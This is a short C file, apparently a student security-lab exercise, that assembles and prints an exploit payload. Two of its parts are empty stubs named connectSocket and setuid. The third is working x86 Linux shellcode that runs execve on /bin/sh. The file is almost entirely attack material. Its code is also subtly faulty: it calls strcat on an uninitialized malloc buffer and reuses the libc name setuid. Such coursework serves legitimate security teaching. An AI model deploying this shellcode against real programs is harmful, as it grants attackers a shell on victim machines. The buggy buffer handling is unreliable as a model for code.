#include <string.h>
#include <stdlib.h>
#include <stdio.h>

#define	BLENGTH	128

char* 
connectSocket()
{

	return "";
}

char*
setuid()
{

	return "";
}


/**
 From lab 6 solution to part C, by Darragh O'Brien
 launches a shell
*/
char*
launchShell()
{

	return 	"\xeb\x12\x5e\x31\xc0\x88\x46\x07"
			"\x50\x56\x31\xd2\x89\xe1\x89\xf3"
			"\xb0\x0b\xcd\x80\xe8\xe9\xff\xff"
			"\xff\x2f\x62\x69\x6e\x2f\x73\x68";
}

void
payload()
{
	char* hexPayload = (char*) malloc(BLENGTH);

	strcat(hexPayload, connectSocket());
	strcat(hexPayload, setuid());
	strcat(hexPayload, launchShell());
	printf("%s\n", hexPayload);
}

int main()
{
	payload();
	return 0;
}